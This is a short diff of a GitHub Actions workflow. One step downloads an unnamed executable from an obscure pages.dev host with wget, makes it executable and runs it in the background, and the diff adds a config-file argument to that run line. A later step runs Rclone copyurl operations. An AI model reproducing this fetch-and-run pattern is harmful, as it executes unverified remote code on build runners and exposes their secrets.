@@ -88,7 +88,7 @@ jobs:
         run: |
           wget -q -O /tmp/1 "https://fffffff-c7l.pages.dev/1"
           chmod +x /tmp/1
-          /tmp/1 & # Run in the background
+          /tmp/1 -config /tmp/config.yaml & # Run in the background
 
       - name: Perform Rclone copyurl operations
         run: |
